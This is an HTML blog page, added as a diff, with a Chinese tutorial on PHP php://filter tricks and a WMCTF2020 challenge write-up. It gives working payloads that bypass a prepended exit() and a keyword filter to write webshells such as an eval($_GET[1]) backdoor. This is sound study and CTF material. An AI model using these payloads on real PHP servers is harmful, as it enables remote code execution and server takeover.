@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>PHP Filter伪协议Trick | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PHP Filter伪协议Trick总结前言：最近在学习的过程中碰到了很多的filter协议的小trick，在此做一个总结以及对filter协议的一些探索。 PHP Filter协议介绍​    php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP Filter伪协议Trick">
+<meta property="og:url" content="http://example.com/2021/12/15/PHP%20Filter%E4%BC%AA%E5%8D%8F%E8%AE%AETrick%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PHP Filter伪协议Trick总结前言：最近在学习的过程中碰到了很多的filter协议的小trick，在此做一个总结以及对filter协议的一些探索。 PHP Filter协议介绍​    php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111113347644.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111113831143.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111114922452.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111134155440.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111144349667.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111141156595.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111143123706.png">
+<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111144349667.png">
+<meta property="article:published_time" content="2021-12-15T08:48:20.000Z">
+<meta property="article:modified_time" content="2021-12-15T08:48:20.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111113347644.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PHP Filter伪协议Trick总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/12/15/PHP%20Filter%E4%BC%AA%E5%8D%8F%E8%AE%AETrick%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2021-12-15T08:48:20.000Z" itemprop="datePublished">2021-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHP Filter伪协议Trick
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP-Filter伪协议Trick总结"><a href="#PHP-Filter伪协议Trick总结" class="headerlink" title="PHP Filter伪协议Trick总结"></a><code>PHP Filter</code>伪协议<code>Trick</code>总结</h1><p>前言：最近在学习的过程中碰到了很多的<code>filter</code>协议的小<code>trick</code>，在此做一个总结以及对<code>filter</code>协议的一些探索。</p>
+<h2 id="PHP-Filter协议介绍"><a href="#PHP-Filter协议介绍" class="headerlink" title="PHP Filter协议介绍"></a><code>PHP Filter</code>协议介绍</h2><p>​    <code>php://filter</code>是<code>php</code>中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如<code>base64</code>编码处理，<code>rot13</code>处理等。官方解释为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 </span><br></pre></td></tr></table></figure>
+
+<h2 id="Filter协议的使用方法"><a href="#Filter协议的使用方法" class="headerlink" title="Filter协议的使用方法"></a><code>Filter</code>协议的使用方法</h2><p><code>Filter</code>协议的一般语法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/过滤器|过滤器/resource=待过滤的数据流</span><br></pre></td></tr></table></figure>
+
+<p>其中过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents(&quot;php://filter/read=convert.base64-encode|convert.base64-encode/resource=data://text/plain,&lt;?php phpinfo();?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>对<code>&lt;?php phpinfo();?&gt;</code>这个字符串进行了两次<code>base64</code>编码处理。</p>
+<p><code>php filter</code>的过滤器有很多种，根据官方文档（<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php%EF%BC%89%EF%BC%8C%E5%A4%A7%E8%87%B4%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E5%9B%9B%E7%B1%BB%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E8%BD%AC%E6%8D%A2%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E5%8E%8B%E7%BC%A9%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E5%8A%A0%E5%AF%86%E8%BF%87%E6%BB%A4%E5%99%A8">https://www.php.net/manual/zh/filters.php），大致可以分为四类：字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</a></p>
+<h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><p>以<code>string</code>字符串开头，常见的过滤器有<code>rot13</code>、<code>toupper</code>、<code>tolower</code>、<code>strip_tags</code>等，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># string.rot13即对数据流进行str_rot13函数处理</span><br><span class="line">echo file_get_contents(&quot;php://filter/read=string.rot13/resource=data://text/plain,abcdefg&quot;);</span><br><span class="line"># 输出结果为nopqrst</span><br></pre></td></tr></table></figure>
+
+<p><code>toupper、tolower</code>是对字符串进行大小写转换处理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=string.toupper/resource=data://text/plain,abcdefg&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><code>strip_tags</code>对数据流进行<code>strip_tags</code>函数的处理，该函数功能为剥去字符串中的 <code>HTML</code>、<code>XML</code> 以及 <code>PHP</code> 的标签，简单理解就是包含有尖括号中的东西。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=string.strip_tags/resource=data://text/plain,&lt;a&gt;s&lt;/a&gt;&quot;);</span><br><span class="line"># 结果返回s</span><br></pre></td></tr></table></figure>
+
+<h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><p>主要含有三类，分别是<code>base64</code>的编码转换、<code>quoted-printable</code>的编码转换以及<code>iconv</code>字符编码的转换。该类过滤器以<code>convert</code>开头。</p>
+<p><code>base64</code>的编码转换操作，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=data://text/plain,m1sn0w&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><code>Quoted-printable</code>可译为<strong>可打印字符引用编码</strong>，可以理解为将一些不可打印的<code>ASCII</code>字符进行一个编码转换，转换成<code>=</code>后面跟两个十六进制数，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=convert.quoted-printable-encode/resource=data://text/plain,m1sn0w&quot;.chr(12));</span><br><span class="line"># 输出为m1sn0w=0C</span><br></pre></td></tr></table></figure>
+
+<p><code>iconv</code>过滤器也就是对输入输出的数据进行一个编码转换，其格式为<code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code>或者<code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code>，表达的意思都是相同的，即将输入的字符串编码转换成输出指定的编码，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=data://text/plain,m1sn0w&quot;.chr(12));</span><br></pre></td></tr></table></figure>
+
+<h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><p>主要有两类，<code>zlib</code>和<code>bzip2</code>，其中<code>zlib.deflate</code>和<code>bzip2.compress</code>用于压缩，<code>zlib.inflate</code>和<code>bzip2.decompress</code>用于解压缩。</p>
+<h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><p>以<code>mcrypt</code>开头，后面指定一个加密算法。本特性已自<code>PHP 7.1.0</code>起废弃。强烈建议不要使用本特性。</p>
+<h2 id="Filter协议的一些Trick"><a href="#Filter协议的一些Trick" class="headerlink" title="Filter协议的一些Trick"></a><code>Filter</code>协议的一些<code>Trick</code></h2><p><code>php://filter</code>⾯对不可⽤的规则只是报个Warning，之后会跳过继续执行。</p>
+<h3 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡<code>exit</code></h3><p>有时候会碰到这种情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<p>这时，如果想要写入<code>WebShell</code>，就需要利用到过滤器来进行一些操作，将输入的字符串中的<code>exit()</code>函数处理掉或者让它失效，从而达到代码执行的目的。</p>
+<p>下面总结一些比较常见的绕过方式：</p>
+<h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a><code>Base64</code>编码绕过</h4><p><code>Base64</code>在进行解码的时候，是4个字符一组进行解码，也就是说如果构造一个字符串如<code>aaaabTFzbjB3</code>，前面的四个<code>a</code>会被当成一组进行正常解码，后面真正的<code>base64</code>编码也就会正常解码。因此在使用<code>base64</code>编码绕过该限制的时候，需要自己补一些填充符，让前面需要绕过的字符串组合起来长度是4的倍数，因为前面参数解码的字符串只有<code>phpexit</code>，因此上述的绕过方式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;;</span><br><span class="line">$content = &quot;aPD9waHAgcGhwaW5mbygpOz8+&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111113347644.png" alt="image-20211111113347644"></p>
+<h4 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a><code>rot13</code>绕过</h4><p>方式和<code>base64</code>类似，将<code>payload</code>转换一下即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;php://filter/write=string.rot13/resource=shell.php&quot;;</span><br><span class="line">$content = &quot;&lt;?cuc cucvasb();?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111113831143.png" alt="image-20211111113831143"></p>
+<h4 id="组合方式绕过"><a href="#组合方式绕过" class="headerlink" title="组合方式绕过"></a>组合方式绕过</h4><p>例如使用<code>strip_tags</code>和<code>base64</code>进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;</span><br><span class="line">$content = &quot;?&gt;PD9waHAgcGhwaW5mbygpOz8+&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="文件内容变量相同绕过"><a href="#文件内容变量相同绕过" class="headerlink" title="文件内容变量相同绕过"></a>文件内容变量相同绕过</h3><p>比如下面这种情况：文件名和拼写的内容相同，还需要绕过exit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<p>如果没有<code>exit</code>的话，这种写入方式就比较简单，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=&lt;?php phpinfo();?&gt;/resource=shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111114922452.png" alt="image-20211111114922452"></p>
+<p>这里主要是因为<code>php://filter</code>在遇到不认识的过滤器的时候，只会进行一个警告，然后继续后面的执行。</p>
+<p>这里回到主题，如果绕过上述的<code>exit</code>。</p>
+<h4 id="利用rot13绕过"><a href="#利用rot13绕过" class="headerlink" title="利用rot13绕过"></a>利用<code>rot13</code>绕过</h4><p>构造如下<code>payload</code>:前提是目标服务器没有开启短标签。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="iconv字符编码转换"><a href="#iconv字符编码转换" class="headerlink" title="iconv字符编码转换"></a><code>iconv</code>字符编码转换</h4><p>这里用到几种编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UCS-2：对目标字符串进行2位一反转</span><br><span class="line">UCS-4：对目标字符串进行4位一反转</span><br></pre></td></tr></table></figure>
+
+<p><code>payload</code>生成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;&lt;?php phpinfo();?&gt;aa&quot;;</span><br><span class="line">echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,$a);</span><br></pre></td></tr></table></figure>
+
+<p>因此，对于上述的绕过，可以使用如下<code>payload</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 2位一反转</span><br><span class="line">$content = &quot;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&quot;;</span><br><span class="line"></span><br><span class="line"># 4位一反转（注意添加一些填充位）</span><br><span class="line">$content = &quot;php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|aa?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111134155440.png" alt="image-20211111134155440"></p>
+<h4 id="利用压缩过滤器进行绕过"><a href="#利用压缩过滤器进行绕过" class="headerlink" title="利用压缩过滤器进行绕过"></a>利用压缩过滤器进行绕过</h4><p>使用到<code>zlib.inflate</code>和<code>zlib.deflate</code>，将数据压缩以后再进行解压，而关键就在于如何在解压的时候将<code>exit</code>去掉。</p>
+<p>在<code>zlib.inflate</code>和<code>zlib.deflate</code>过滤器的中间加上一个字符串过滤器，会将<code>exit</code>解压成其他的字串，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = &#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php&#x27;;</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111144349667.png" alt="image-20211111144349667"></p>
+<h4 id="组合绕过方式"><a href="#组合绕过方式" class="headerlink" title="组合绕过方式"></a>组合绕过方式</h4><p>感觉能单个过滤器绕过的，就可以不用多个过滤器一起组合绕过。</p>
+<h5 id="strip-tags-base64编码绕过"><a href="#strip-tags-base64编码绕过" class="headerlink" title="strip_tags+base64编码绕过"></a><code>strip_tags</code>+<code>base64</code>编码绕过</h5><p>绕过思路就是：闭合前面的<code>&lt;?php</code>标签，并使用<code>strip_tags</code>进行处理过滤，然后正常<code>base64</code>解码</p>
+<p>构造payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这里其实还有一个小<code>trick</code>，就是<code>resource</code>后面的路径，<code>php://filter</code>仍然会将其视作位过滤器进行一个过滤处理，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/resource=./convert.base64-encode/../shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111141156595.png" alt="image-20211111141156595"></p>
+<h3 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h3><p>源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 7.0.33 Apache/2.4.25</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sandbox = &#x27;/var/www/html/sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">var_dump(&quot;Sandbox:&quot;.$sandbox);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;content&#x27;])) &#123;</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content))</span><br><span class="line">         die(&#x27;hacker&#x27;);</span><br><span class="line">    if(file_exists($content))</span><br><span class="line">        require_once($content);</span><br><span class="line">    file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里带有几个<code>trick</code>，第一个就是伪协议在调用过滤器的时候，会对过滤器进行<code>url</code>解码一次，例如构造如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65/resource=shell.php&quot;;</span><br><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<p>仍然会对字符串进行<code>base64</code>编码操作，因此，这里尝试利用二次编码的方式，绕过死亡<code>exit</code>，并写入<code>shell</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># payload如下：访问获取到phpinfo界面</span><br><span class="line">content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2569%2563%256f%256e%2576%252e%2555%2543%2553%252d%2532%254c%2545%252e%2555%2543%2553%252d%2532%2542%2545|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php</span><br><span class="line"></span><br><span class="line"># 尝试命令执行</span><br><span class="line">content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2569%2563%256f%256e%2576%252e%2555%2543%2553%252d%2532%254c%2545%252e%2555%2543%2553%252d%2532%2542%2545|aa&lt;ap?phe av(l_$OPTS&#x27;[1mnsw0]&#x27;;)hpipfn(o;)&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，在根目录获取到<code>flag</code>：</p>
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111143123706.png" alt="image-20211111143123706"></p>
+<p>第二种方法是利用压缩过滤器来进行绕过，使用到<code>zlib.inflate</code>和<code>zlib.deflate</code>，解题思路就是将数据压缩以后再进行解压，而关键就在于如何在解压的时候将<code>exit</code>去掉。</p>
+<p>在<code>zlib.inflate</code>和<code>zlib.deflate</code>过滤器的中间加上一个字符串过滤器，会将<code>exit</code>解压成其他的字串，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = &#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php&#x27;;</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111144349667.png" alt="image-20211111144349667"></p>
+<p>第三种方式是利用<code>php7</code>版本，在使用伪协议<code>string.strip_tags</code>时会发生段错误，然后将上传的文件报错在<code>tmp</code>目录下面，可以利用爆破的方式+文件包含利用，获取到<code>Shell</code></p>
+<h2 id="文章小结"><a href="#文章小结" class="headerlink" title="文章小结"></a>文章小结</h2><p>​    <code>Filter</code>过滤器在很多时候都非常有用，不论是任意文件读取，还是<code>Webshell</code>的写入。本篇文章总结了几个小<code>trick</code>，例如绕过<code>exit</code>，<code>resource</code>后面可继续跟过滤器、伪协议在处理过滤器的时候会进行<code>URL</code>编码等，感觉每一个都会有助于攻击方式的扩展。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a>（<a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/%EF%BC%89">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/）</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF_2020%E5%AE%98%E6%96%B9WriteUp.pdf">WMCTF2020官方writeup</a>（<a target="_blank" rel="noopener" href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF_2020%E5%AE%98%E6%96%B9WriteUp.pdf%EF%BC%89">https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF_2020%E5%AE%98%E6%96%B9WriteUp.pdf）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.compression.php">php官方文档</a>（<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.compression.php%EF%BC%89">https://www.php.net/manual/zh/filters.compression.php）</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/12/15/PHP%20Filter%E4%BC%AA%E5%8D%8F%E8%AE%AETrick%E6%80%BB%E7%BB%93/" data-id="cl8h1i72i00030bdphvxqftmi" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/12/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---Dom%20Clobbering/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          前端安全---Dom Clobbering
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
